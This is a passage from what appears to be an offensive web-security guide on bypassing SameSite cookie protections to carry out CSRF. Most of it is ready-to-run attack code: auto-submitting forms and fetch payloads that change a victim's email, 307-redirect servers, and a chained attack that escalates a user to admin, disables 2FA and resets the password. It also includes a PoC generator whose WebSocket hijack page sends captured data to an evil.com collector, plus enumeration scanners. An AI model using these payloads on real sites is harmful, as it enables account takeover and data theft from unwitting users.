    echo "UA: $(echo $ua | cut -c1-60)..."
    curl -s -o /dev/null -w "  Status: %{http_code}\n" \
      -X POST "https://target.com/api/update" \
      -H "Content-Type: text/plain" \
      -H "Origin: https://evil.com" \
      -H "Cookie: session=VALID" \
      -H "User-Agent: $ua" \
      -d '{"email":"test@probe.com"}'
  done
  ```
  :::
::

## SameSite=None Exploitation

::note
`SameSite=None` provides **no** SameSite protection — cookies are sent on all cross-site requests. However, it requires the `Secure` flag (HTTPS only). If an application explicitly sets `SameSite=None`, standard cross-site CSRF attacks work without any bypass needed.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Identify SameSite=None Cookies"}
  ```bash
  # Find cookies explicitly set to SameSite=None
  curl -sI https://target.com/ | grep -i "set-cookie" | \
    while IFS= read -r line; do
      if echo "$line" | grep -qi "samesite=none"; then
        name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
        secure=$(echo "$line" | grep -qi "secure" && echo "Yes" || echo "NO!")
        echo "[+] SameSite=None: $name (Secure: $secure)"
        
        if [ "$secure" = "NO!" ]; then
          echo "    [!] CRITICAL: SameSite=None without Secure → Cookie REJECTED by browsers"
          echo "    [!] May fall back to default Lax behavior"
        else
          echo "    [*] Full cross-site CSRF possible (no SameSite bypass needed)"
        fi
      fi
    done

  # Also check login/auth endpoints
  for ep in "/login" "/api/auth" "/oauth/token" "/api/session"; do
    curl -sI "https://target.com${ep}" -X POST \
      -d "user=test&pass=test" 2>/dev/null | \
      grep -i "set-cookie" | \
      while IFS= read -r line; do
        if echo "$line" | grep -qi "samesite=none"; then
          name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
          echo "[+] SameSite=None on $ep: $name"
        fi
      done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Direct Cross-Site CSRF (SameSite=None)"}
  ```html
  <!-- When SameSite=None; Secure is set, standard CSRF works -->
  <!-- No bypass needed — all cross-site techniques are effective -->

  <!-- Simple form-based CSRF -->
  <html>
  <body>
  <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>

  <!-- Fetch-based CSRF -->
  <script>
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include', // SameSite=None cookies included
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
  </script>

  <!-- sendBeacon CSRF -->
  <script>
  navigator.sendBeacon('https://target.com/api/user/email',
    new Blob(['{"email":"attacker@evil.com"}'], { type: 'text/plain' }));
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Mixed Content Downgrade"}
  ```bash
  # SameSite=None requires Secure flag (HTTPS only)
  # If target serves HTTP endpoints, test for mixed content
  
  # Check if HTTP is available
  curl -sI http://target.com/api/user/email \
    -o /dev/null -w "HTTP: %{http_code} → %{redirect_url}\n"
  
  # Check if HTTP API endpoints respond
  curl -sI http://target.com/api/user/email \
    -X POST -H "Content-Type: application/json" \
    -d '{"test":"probe"}' \
    -o /dev/null -w "HTTP POST: %{http_code}\n"

  # If HTTP endpoint works without redirect:
  # SameSite=None; Secure cookies won't be sent to HTTP
  # BUT: cookies without SameSite (defaulting to Lax) on HTTP
  # may behave differently

  # Check for HSTS bypass
  curl -sI https://target.com/ | grep -i "strict-transport-security"
  # If no HSTS or short max-age → HTTP downgrade possible

  # Check subdomain HTTP availability (no HSTS preload for subdomains)
  cat same_site_origins.txt 2>/dev/null | while read sub; do
    http_resp=$(curl -s -o /dev/null -w "%{http_code}" "http://${sub}/" --max-time 5 2>/dev/null)
    if [[ "$http_resp" =~ ^(200|301|302|403)$ ]]; then
      echo "HTTP available: http://${sub}/ (Status: $http_resp)"
    fi
  done
  ```
  :::
::

## HTTP 307/308 Redirect Bypass

::tip
HTTP 307 (Temporary) and 308 (Permanent) redirects preserve the request method and body. An attacker server can accept a POST request with simple content-type, then 307-redirect it to the target. The browser follows the redirect as a **same-site** navigation from the target's perspective in some scenarios.
::

::code-group
```python [307 Redirect Server]
#!/usr/bin/env python3
"""
307 Redirect Server for SameSite Bypass
Works best combined with 2-minute Lax+POST window or SameSite=None
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/api/user/email'

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 307 preserves POST method and body
        self.send_response(307)
        self.send_header('Location', TARGET)
        self.end_headers()
        print(f'[+] 307 redirect: POST → {TARGET}')
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        html = f'''<!DOCTYPE html>
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<form method="POST" enctype="text/plain">
  <input name='{{"email":"attacker@evil.com","p":"' value='"}}' type="hidden">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>'''
        self.wfile.write(html.encode())

port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
print(f'[*] 307 server on :{port} → {TARGET}')
HTTPServer(('0.0.0.0', port), Handler).serve_forever()
```

```python [Multi-Target 307 Server]
#!/usr/bin/env python3
"""Multi-target 307 redirect with sequential attacks"""

from flask import Flask, redirect, request
import sys

app = Flask(__name__)

TARGETS = {
    'email': ('https://target.com/api/user/email', '{"email":"attacker@evil.com","p":"'),
    'role': ('https://target.com/api/user/role', '{"role":"admin","p":"'),
    'token': ('https://target.com/api/tokens', '{"name":"svc","scope":"admin","p":"'),
    '2fa': ('https://target.com/api/user/2fa/disable', '{"confirm":true,"p":"'),
    'password': ('https://target.com/api/user/password', '{"new_password":"Pwned!","p":"'),
}

@app.route('/<action>', methods=['POST'])
def do_redirect(action):
    if action in TARGETS:
        return redirect(TARGETS[action][0], code=307)
    return 'Not found', 404

@app.route('/<action>', methods=['GET'])
def serve_form(action):
    if action not in TARGETS:
        return 'Not found', 404
    payload = TARGETS[action][1]
    return f'''<!DOCTYPE html>
<html><head><meta name="referrer" content="no-referrer"></head>
<body>
<form action="/{action}" method="POST" enctype="text/plain">
  <input name=\'{payload}\' value=\'"}}\'  type="hidden">
</form>
<script>document.forms[0].submit();</script>
</body></html>'''

@app.route('/chain')
def chain_attack():
    return '''<!DOCTYPE html>
<html><body>
<script>
const attacks = ['email', 'role', '2fa', 'token', 'password'];
let i = 0;
function next() {
  if (i >= attacks.length) return;
  const ifr = document.createElement('iframe');
  ifr.name = 'f' + i;
  ifr.style.display = 'none';
  document.body.appendChild(ifr);
  
  const form = document.createElement('form');
  form.action = '/' + attacks[i];
  form.method = 'POST';
  form.enctype = 'text/plain';
  form.target = 'f' + i;
  
  const input = document.createElement('input');
  input.type = 'hidden';
  input.name = '{"probe":"test","p":"';
  input.value = '"}';
  form.appendChild(input);
  
  document.body.appendChild(form);
  form.submit();
  
  i++;
  setTimeout(next, 800);
}
next();
</script>
</body></html>'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(sys.argv[1]) if len(sys.argv) > 1 else 8080)
```
::

## Comprehensive PoC Generator

::code-tree{default-value="samesite_bypass_generator.py"}
```python [samesite_bypass_generator.py]
#!/usr/bin/env python3
"""
SameSite Bypass CSRF PoC Generator
Generates exploit pages for each SameSite bypass technique
"""

import json, sys, argparse, html, os

class SameSiteBypassGenerator:
    def __init__(self, url, data, output_dir='samesite_pocs'):
        self.url = url
        self.data = data
        self.outdir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def _json_form_parts(self):
        j = json.dumps(self.data, separators=(',',':'))
        return j[:-1] + ',"_p":"', '"}'
    
    def method_override_get(self):
        params = '&'.join(f'{k}={v}' for k, v in self.data.items())
        overrides = ['_method=POST', 'method=POST', 'X-HTTP-Method-Override=POST']
        pocs = []
        for ovr in overrides:
            poc = f'''<!DOCTYPE html>
<html><body>
<script>
window.location = '{html.escape(self.url)}?{ovr}&{params}';
</script>
</body></html>'''
            pocs.append((ovr.split('=')[0], poc))
        return pocs

    def popup_post(self):
        name, val = self._json_form_parts()
        return f'''<!DOCTYPE html>
<html><body>
<button onclick="go()" style="font-size:20px;padding:20px 40px">Click to Continue</button>
<script>
function go() {{
  var p = window.open('about:blank', 'csrf', 'width=1,height=1');
  p.document.write(`
    <form action="{html.escape(self.url)}" method="POST" enctype="text/plain">
      <input name='{html.escape(name)}' value='{html.escape(val)}' type="hidden">
    </form>
    <script>document.forms[0].submit();<\\/script>
  `);
  p.document.close();
  setTimeout(() => {{ try {{ p.close(); }} catch(e) {{}} }}, 3000);
}}
</script>
</body></html>'''

    def two_minute_window(self):
        name, val = self._json_form_parts()
        return f'''<!DOCTYPE html>
<html><head><meta name="referrer" content="no-referrer"></head>
<body>
<script>
// Phase 1: Force cookie refresh via silent re-auth
var authWin = window.open(
  '{html.escape(self.url.rsplit("/",2)[0])}/oauth/authorize?prompt=none',
  '_blank', 'width=1,height=1');

setTimeout(function() {{
  try {{ authWin.close(); }} catch(e) {{}}
  
  // Phase 2: POST CSRF within 2-minute Lax+POST window
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = '{html.escape(self.url)}';
  form.enctype = 'text/plain';
  
  var input = document.createElement('input');
  input.type = 'hidden';
  input.name = '{html.escape(name)}';
  input.value = '{html.escape(val)}';
  form.appendChild(input);
  
  document.body.appendChild(form);
  form.submit();
}}, 5000);
</script>
</body></html>'''

    def websocket_csrf(self):
        ws_url = self.url.replace('https://', 'wss://').replace('http://', 'ws://')
        ws_base = ws_url.rsplit('/', 1)[0]
        return f'''<!DOCTYPE html>
<html><body>
<script>
var ws = new WebSocket('{ws_base}/ws');
ws.onopen = function() {{
  ws.send(JSON.stringify({json.dumps(self.data)}));
}};
ws.onmessage = function(e) {{
  navigator.sendBeacon('https://evil.com/ws-exfil',
    new Blob([e.data], {{type:'text/plain'}}));
}};
ws.onerror = function() {{
  ['ws','websocket','socket','socket.io','cable','hub','realtime'].forEach(p => {{
    try {{
      var alt = new WebSocket('{ws_base}/' + p);
      alt.onopen = () => alt.send(JSON.stringify({json.dumps(self.data)}));
    }} catch(e) {{}}
  }});
}};
</script>
</body></html>'''

    def form_target_blank(self):
        name, val = self._json_form_parts()
        return f'''<!DOCTYPE html>
<html><head><meta name="referrer" content="no-referrer"></head>
<body>
<form action="{html.escape(self.url)}" method="POST" enctype="text/plain" target="_blank">
  <input name='{html.escape(name)}' value='{html.escape(val)}' type="hidden">
</form>
<script>document.forms[0].submit();</script>
</body></html>'''

    def redirect_chain(self, redirect_url):
        params = '&'.join(f'{k}={v}' for k, v in self.data.items())
        api_path = '/' + self.url.split('/', 3)[-1]
        return f'''<!DOCTYPE html>
<html><body>
<script>
window.location = '{html.escape(redirect_url)}' +
  encodeURIComponent('{api_path}?_method=POST&{params}');
</script>
</body></html>'''

    def generate_all(self, redirect_url=None):
        pocs = {}
        
        for ovr_name, poc in self.method_override_get():
            fn = f'method_override_{ovr_name}.html'
            pocs[fn] = poc
        
        pocs['popup_post.html'] = self.popup_post()
        pocs['two_minute_window.html'] = self.two_minute_window()
        pocs['websocket_csrf.html'] = self.websocket_csrf()
        pocs['form_target_blank.html'] = self.form_target_blank()
        
        if redirect_url:
            pocs['redirect_chain.html'] = self.redirect_chain(redirect_url)
        
        for filename, content in pocs.items():
            filepath = os.path.join(self.outdir, filename)
            with open(filepath, 'w') as f:
                f.write(content)
            print(f'[+] {filepath}')
        
        print(f'\n[*] Generated {len(pocs)} PoC files in {self.outdir}/')

if __name__ == '__main__':
    p = argparse.ArgumentParser(description='SameSite Bypass PoC Generator')
    p.add_argument('-u', '--url', required=True, help='Target URL')
    p.add_argument('-d', '--data', required=True, help='JSON payload')
    p.add_argument('-r', '--redirect', help='Open redirect URL on target')
    p.add_argument('-o', '--output', default='samesite_pocs', help='Output directory')
    args = p.parse_args()
    
    gen = SameSiteBypassGenerator(args.url, json.loads(args.data), args.output)
    gen.generate_all(args.redirect)
```

```bash [usage.sh]
# Generate all SameSite bypass PoCs
python3 samesite_bypass_generator.py \
  -u "https://target.com/api/user/email" \
  -d '{"email":"attacker@evil.com"}' \
  -o email_pocs

# With open redirect for chain exploit
python3 samesite_bypass_generator.py \
  -u "https://target.com/api/user/role" \
  -d '{"role":"admin"}' \
  -r "https://target.com/redirect?url=" \
  -o role_pocs

# Serve PoCs
cd email_pocs && python3 -m http.server 8080
```
::

## Automated SameSite Bypass Scanner

::code-group
```bash [samesite_scanner.sh]
#!/bin/bash
# SameSite Cookie Bypass Scanner
# Tests all bypass techniques against target endpoints

TARGET="${1:?Usage: $0 <base_url> <session_cookie>}"
COOKIE="${2:?Provide session cookie}"
REPORT="samesite_scan_$(date +%Y%m%d_%H%M%S).txt"

echo "================================================" | tee "$REPORT"
echo "SameSite Cookie Bypass Scanner" | tee -a "$REPORT"
echo "Target: $TARGET" | tee -a "$REPORT"
echo "Date: $(date)" | tee -a "$REPORT"
echo "================================================" | tee -a "$REPORT"

# Phase 1: Cookie analysis
echo -e "\n[Phase 1] Cookie Analysis" | tee -a "$REPORT"
curl -sI "$TARGET" | grep -i "set-cookie" | \
  while IFS= read -r line; do
    name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
    ss=$(echo "$line" | grep -ioP 'samesite=\K\w+' || echo "NOT_SET")
    secure=$(echo "$line" | grep -qi "secure" && echo "Y" || echo "N")
    echo "  Cookie: $name | SameSite=$ss | Secure=$secure" | tee -a "$REPORT"
  done

# Phase 2: Method override testing
echo -e "\n[Phase 2] Method Override Detection" | tee -a "$REPORT"
ENDPOINTS=("/api/user/email" "/api/user/profile" "/api/settings" "/api/user/role")
OVERRIDES=("_method" "method" "X-HTTP-Method-Override" "_METHOD" "httpMethod")

for ep in "${ENDPOINTS[@]}"; do
  for ovr in "${OVERRIDES[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "${TARGET}${ep}?${ovr}=POST&test=probe" \
      -H "Cookie: $COOKIE" --max-time 10 2>/dev/null)
    get_status=$(curl -s -o /dev/null -w "%{http_code}" \
      "${TARGET}${ep}" \
      -H "Cookie: $COOKIE" --max-time 10 2>/dev/null)
    
    if [ "$status" != "$get_status" ] && [[ "$status" =~ ^(200|201|204|400|422)$ ]]; then
      echo "  [!] OVERRIDE: ${ep}?${ovr}=POST → HTTP $status" | tee -a "$REPORT"
    fi
  done
done

# Phase 3: WebSocket endpoint detection
echo -e "\n[Phase 3] WebSocket Endpoints" | tee -a "$REPORT"
WS_PATHS=("/ws" "/websocket" "/socket" "/socket.io" "/cable" "/hub" "/signalr" "/graphql-ws" "/realtime" "/ws/api")
for ws in "${WS_PATHS[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "${TARGET}${ws}" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: 13" \
    -H "Cookie: $COOKIE" --max-time 5 2>/dev/null)
  if [[ "$status" =~ ^(101|200|400|426)$ ]]; then
    echo "  [!] WebSocket: ${TARGET}${ws} → HTTP $status (bypasses ALL SameSite)" | tee -a "$REPORT"
  fi
done

# Phase 4: Open redirect detection
echo -e "\n[Phase 4] Open Redirect (for Lax/Strict bypass chain)" | tee -a "$REPORT"
REDIRECT_PARAMS=("url" "redirect" "next" "return" "goto" "redirect_url" "return_url" "continue")
for param in "${REDIRECT_PARAMS[@]}"; do
  for path in "/" "/redirect" "/goto" "/login" "/auth/callback" "/oauth/callback"; do
    location=$(curl -s -o /dev/null -w "%{redirect_url}" \
      "${TARGET}${path}?${param}=https://evil.com" --max-time 5 2>/dev/null)
    if echo "$location" | grep -qi "evil.com"; then
      echo "  [!] REDIRECT: ${TARGET}${path}?${param}=https://evil.com" | tee -a "$REPORT"
    fi
  done
done

# Phase 5: 2-minute window candidates
echo -e "\n[Phase 5] 2-Minute Lax+POST Window Candidates" | tee -a "$REPORT"
curl -sI "$TARGET" | grep -i "set-cookie" | \
  while IFS= read -r line; do
    if ! echo "$line" | grep -qi "samesite"; then
      name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
      echo "  [!] $name: No SameSite attr → 2-min Lax+POST window (Chrome)" | tee -a "$REPORT"
    fi
  done

# Phase 6: Same-site subdomain analysis
echo -e "\n[Phase 6] Same-Site Subdomain Analysis" | tee -a "$REPORT"
domain=$(echo "$TARGET" | grep -oP 'https?://\K[^/]+')
echo "  Checking subdomains of: $domain"
subfinder -d "$domain" -silent 2>/dev/null | head -20 | \
  while read sub; do
    alive=$(curl -s -o /dev/null -w "%{http_code}" "https://${sub}/" --max-time 5 2>/dev/null)
    if [ "$alive" = "200" ]; then
      echo "  [+] Alive same-site: https://${sub}/ (potential Strict bypass via XSS)" | tee -a "$REPORT"
    fi
  done

echo -e "\n================================================" | tee -a "$REPORT"
echo "[*] Scan complete. Report: $REPORT" | tee -a "$REPORT"
```

```python [samesite_analyzer.py]
#!/usr/bin/env python3
"""
Advanced SameSite Cookie Bypass Analyzer
Comprehensive testing across all bypass vectors
"""

import requests, json, sys, re, warnings
from urllib.parse import urlparse, urljoin
from datetime import datetime

warnings.filterwarnings('ignore')

class SameSiteAnalyzer:
    def __init__(self, base_url, cookies):
        self.base = base_url.rstrip('/')
        self.domain = urlparse(base_url).netloc
        self.session = requests.Session()
        self.session.cookies.update(cookies)
        self.session.verify = False
        self.findings = []
    
    def add(self, category, severity, desc, details=''):
        self.findings.append({
            'category': category, 'severity': severity,
            'description': desc, 'details': details
        })
        icons = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🟢'}
        print(f'  {icons.get(severity,"⚪")} [{severity}] {desc}')
        if details: print(f'     → {details[:120]}')
    
    def analyze_cookies(self):
        print('\n[*] Analyzing SameSite cookie configuration...')
        resp = self.session.get(self.base)
        for cookie in self.session.cookies:
            # requests library doesn't expose SameSite directly
            # Need to check raw Set-Cookie headers
            pass
        
        # Use raw headers
        resp = requests.get(self.base, verify=False)
        set_cookies = resp.headers.get('Set-Cookie', '')
        
        for header_line in resp.raw.headers.getlist('Set-Cookie') if hasattr(resp.raw, 'headers') else [set_cookies]:
            name = header_line.split('=')[0].strip()
            ss = re.search(r'samesite=(\w+)', header_line, re.I)
            ss_val = ss.group(1) if ss else 'NOT_SET'
            secure = bool(re.search(r'\bsecure\b', header_line, re.I))
            
            if ss_val.upper() == 'NONE' and secure:
                self.add('COOKIE', 'CRITICAL',
                    f'{name}: SameSite=None; Secure',
                    'Full cross-site CSRF possible, no bypass needed')
            elif ss_val.upper() == 'NONE' and not secure:
                self.add('COOKIE', 'MEDIUM',
                    f'{name}: SameSite=None WITHOUT Secure',
                    'Cookie rejected by browsers, may fall back to Lax')
            elif ss_val == 'NOT_SET':
                self.add('COOKIE', 'HIGH',
                    f'{name}: No SameSite attribute',
                    'Defaults to Lax, subject to 2-minute Lax+POST window in Chrome')
            elif ss_val.upper() == 'LAX':
                self.add('COOKIE', 'MEDIUM',
                    f'{name}: SameSite=Lax',
                    'Bypass via method override, popup, or same-site gadget')
            elif ss_val.upper() == 'STRICT':
                self.add('COOKIE', 'LOW',
                    f'{name}: SameSite=Strict',
                    'Bypass via same-site XSS, subdomain takeover, or WebSocket')
    
    def test_method_overrides(self):
        print('\n[*] Testing method override parameters...')
        endpoints = ['/api/user/email', '/api/user/profile', '/api/settings',
                     '/api/user/role', '/api/account', '/api/user/update']
        overrides = ['_method', 'method', 'X-HTTP-Method-Override', '_METHOD', 'httpMethod']
        
        for ep in endpoints:
            normal = self.session.get(f'{self.base}{ep}').status_code
            for ovr in overrides:
                try:
                    resp = self.session.get(
                        f'{self.base}{ep}?{ovr}=POST&test=probe', timeout=10)
                    if resp.status_code != normal and resp.status_code in [200,201,204,400,422]:
                        self.add('METHOD_OVERRIDE', 'HIGH',
                            f'Method override works: {ep}?{ovr}=POST',
                            f'Status changed: {normal} → {resp.status_code}')
                except: pass
    
    def test_websocket(self):
        print('\n[*] Testing WebSocket endpoints...')
        ws_paths = ['/ws', '/websocket', '/socket', '/socket.io', '/cable',
                    '/hub', '/signalr', '/graphql-ws', '/realtime', '/ws/api']
        
        for path in ws_paths:
            try:
                resp = requests.get(f'{self.base}{path}',
                    headers={
                        'Upgrade': 'websocket', 'Connection': 'Upgrade',
                        'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                        'Sec-WebSocket-Version': '13'
                    }, timeout=5, verify=False)
                
                if resp.status_code in [101, 200, 400, 426]:
                    self.add('WEBSOCKET', 'CRITICAL',
                        f'WebSocket endpoint: {path}',
                        f'HTTP {resp.status_code} - Bypasses ALL SameSite restrictions')
            except: pass
    
    def test_open_redirects(self):
        print('\n[*] Testing open redirects...')
        params = ['url', 'redirect', 'next', 'return', 'goto',
                  'redirect_url', 'return_url', 'continue', 'to']
        paths = ['/', '/redirect', '/goto', '/login', '/auth/callback', '/oauth/callback']
        
        for path in paths:
            for param in params:
                try:
                    resp = requests.get(
                        f'{self.base}{path}?{param}=https://evil.com',
                        allow_redirects=False, timeout=5, verify=False)
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location:
                        self.add('REDIRECT', 'HIGH',
                            f'Open redirect: {path}?{param}=',
                            f'Redirects to: {location}')
                except: pass
    
    def run_all(self):
        print(f'[*] SameSite Bypass Analysis: {self.base}')
        self.analyze_cookies()
        self.test_method_overrides()
        self.test_websocket()
        self.test_open_redirects()
        
        print(f'\n{"="*50}')
        print(f'Total findings: {len(self.findings)}')
        for sev in ['CRITICAL','HIGH','MEDIUM','LOW']:
            c = sum(1 for f in self.findings if f['severity'] == sev)
            if c: print(f'  {sev}: {c}')
        
        with open('samesite_report.json', 'w') as f:
            json.dump({
                'target': self.base,
                'scan_date': datetime.now().isoformat(),
                'findings': self.findings
            }, f, indent=2)
        print(f'\n[*] Report: samesite_report.json')

if __name__ == '__main__':
    base = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com'
    cookie = sys.argv[2] if len(sys.argv) > 2 else 'SESSION'
    SameSiteAnalyzer(base, {'session': cookie}).run_all()
```
::

## Exploitation Decision Methodology

::steps{level="4"}

#### Enumerate Cookie SameSite Configuration

```bash
curl -sI https://target.com/ | grep -i "set-cookie"
# Determine: Strict, Lax, None, or Not Set (default Lax)
# Identify session cookies vs CSRF cookies vs other cookies
```

#### Select Bypass Strategy Based on SameSite Value

```bash
# SameSite=None; Secure → Direct cross-site CSRF (no bypass needed)
# SameSite=Lax / Not Set → Method override, popup, 2-min window, redirect chain
# SameSite=Strict → Same-site XSS, subdomain takeover, WebSocket, redirect chain
# All values → WebSocket CSRF (always bypasses SameSite)
```

#### Test Method Override Support (Lax/Strict)

```bash
for ovr in "_method" "method" "X-HTTP-Method-Override"; do
  curl -s "${TARGET}/api/endpoint?${ovr}=POST&param=value" \
    -H "Cookie: session=VALID" -o /dev/null -w "%{http_code}\n"
done
```

#### Discover WebSocket Endpoints (All SameSite Values)

```bash
for ws in "/ws" "/websocket" "/socket.io" "/cable" "/hub"; do
  curl -s "${TARGET}${ws}" -H "Upgrade: websocket" \
    -H "Connection: Upgrade" -H "Sec-WebSocket-Version: 13" \
    -o /dev/null -w "${ws}: %{http_code}\n"
done
```

#### Enumerate Same-Site Gadgets (Strict Bypass)

```bash
# Find XSS, open redirects, subdomain takeovers on *.target.com
subfinder -d target.com -silent | httpx -silent | nuclei -t xss/ -t takeovers/
```

#### Generate and Deliver PoC

```bash
python3 samesite_bypass_generator.py \
  -u "https://target.com/api/vulnerable-endpoint" \
  -d '{"email":"attacker@evil.com"}' \
  -r "https://target.com/redirect?url=" \
  -o exploit_pocs

python3 -m http.server 8080
```
::

## Tools & Resources

::card-group
  ::card
  ---
  title: Burp Suite Professional
  icon: i-lucide-shield-check
  to: https://portswigger.net/burp/pro
  target: _blank
  ---
  Primary proxy for cookie analysis, SameSite attribute inspection, WebSocket interception, and CSRF PoC generation with manual testing workflows.
  ::

  ::card
  ---
  title: OWASP ZAP
  icon: i-lucide-search
  to: https://www.zaproxy.org/
  target: _blank
  ---
  Free security scanner with WebSocket proxy support, cookie attribute analysis, and active scanning rules for SameSite misconfigurations and CSRF vulnerabilities.
  ::

  ::card
  ---
  title: subfinder
  icon: i-lucide-layers
  to: https://github.com/projectdiscovery/subfinder
  target: _blank
  ---
  Subdomain discovery for identifying same-site origins. Critical for finding XSS gadgets and takeover targets that bypass SameSite=Strict restrictions.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-target
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based scanner with community templates for subdomain takeover detection, XSS discovery, open redirect finding, and SameSite misconfiguration checks.
  ::

  ::card
  ---
  title: websocat
  icon: i-lucide-plug
  to: https://github.com/vi/websocat
  target: _blank
  ---
  Command-line WebSocket client for discovering and testing WebSocket endpoints. Essential for Cross-Site WebSocket Hijacking attacks that bypass all SameSite values.
  ::

  ::card
  ---
  title: subjack
  icon: i-lucide-anchor
  to: https://github.com/haccer/subjack
  target: _blank
  ---
  Subdomain takeover detection tool. Claimed subdomains provide same-site context for bypassing SameSite=Strict cookies and performing cookie tossing attacks.
  ::

  ::card
  ---
  title: httpx
  icon: i-lucide-globe
  to: https://github.com/projectdiscovery/httpx
  target: _blank
  ---
  HTTP probing toolkit for bulk subdomain liveness checks, header analysis, cookie attribute enumeration, and protocol detection across same-site origins.
  ::

  ::card
  ---
  title: Puppeteer
  icon: i-lucide-monitor
  to: https://pptr.dev/
  target: _blank
  ---
  Headless Chrome automation for detailed cookie attribute analysis, SameSite behavior verification, and automated exploit delivery testing across browser contexts.
  ::

  ::card
  ---
  title: XSRFProbe
  icon: i-lucide-bug
  to: https://github.com/0xInfection/XSRFProbe
  target: _blank
  ---
  CSRF audit toolkit with SameSite analysis capabilities, anti-CSRF token detection, and automated PoC generation for identified bypass opportunities.
  ::

  ::card
  ---
  title: Amass
  icon: i-lucide-radar
  to: https://github.com/owasp-amass/amass
  target: _blank
  ---
  Comprehensive subdomain enumeration for mapping same-site attack surface. DNS reconnaissance identifies sibling subdomains for SameSite=Strict bypass opportunities.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-terminal
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Web fuzzer for method override parameter discovery, open redirect fuzzing, WebSocket path enumeration, and API endpoint brute-forcing during SameSite bypass assessment.
  ::

  ::card
  ---
  title: mitmproxy
  icon: i-lucide-network
  to: https://mitmproxy.org/
  target: _blank
  ---
  Scriptable proxy for automated cookie header manipulation, SameSite attribute stripping, WebSocket interception, and real-time request modification during testing.
  ::
::

### Reference Materials

::card-group
  ::card
  ---
  title: "PortSwigger SameSite Bypass Research"
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
  target: _blank
  ---
  Interactive labs covering Lax bypass via method override, Strict bypass via sibling domain, cookie refresh attacks, and WebSocket CSRF exploitation techniques.
  ::

  ::card
  ---
  title: "Chromium SameSite Updates"
  icon: i-lucide-chrome
  to: https://www.chromium.org/updates/same-site/
  target: _blank
  ---
  Official Chromium documentation on SameSite enforcement timeline, Lax+POST 2-minute exception details, schemeful same-site changes, and browser-specific implementation notes.
  ::

  ::card
  ---
  title: "MDN SameSite Cookies"
  icon: i-lucide-book-marked
  to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies
  target: _blank
  ---
  Mozilla reference on SameSite attribute values, browser compatibility tables, cross-site vs same-site definitions, and cookie scoping mechanics.
  ::

  ::card
  ---
  title: "RFC 6265bis - SameSite Cookies"
  icon: i-lucide-file-code
  to: https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis
  target: _blank
  ---
  IETF specification defining SameSite cookie behavior, same-site computation algorithm, top-level navigation definition, and Lax enforcement requirements.
  ::

  ::card
  ---
  title: "Public Suffix List"
  icon: i-lucide-list
  to: https://publicsuffix.org/
  target: _blank
  ---
  The definitive list that determines same-site boundaries. Understanding eTLD+1 computations is essential for identifying which subdomains are same-site with the target.
  ::

  ::card
  ---
  title: "HackTricks - Cookies"
  icon: i-lucide-skull
  to: https://book.hacktricks.wiki/en/pentesting-web/hacking-with-cookies/
  target: _blank
  ---
  Community-maintained reference covering cookie tossing attacks, SameSite bypass techniques, double-submit cookie exploitation, and cookie injection vectors.
  ::

  ::card
  ---
  title: "WebSocket Security"
  icon: i-lucide-plug
  to: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
  target: _blank
  ---
  PortSwigger research on Cross-Site WebSocket Hijacking, the primary vector for bypassing SameSite=Strict cookies through protocol-level differences.
  ::

  ::card
  ---
  title: "OWASP CSRF Prevention"
  icon: i-lucide-book-open
  to: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  target: _blank
  ---
  Defense reference covering SameSite cookie recommendations, defense-in-depth strategies, and framework-specific CSRF protection that complements SameSite analysis.
  ::
::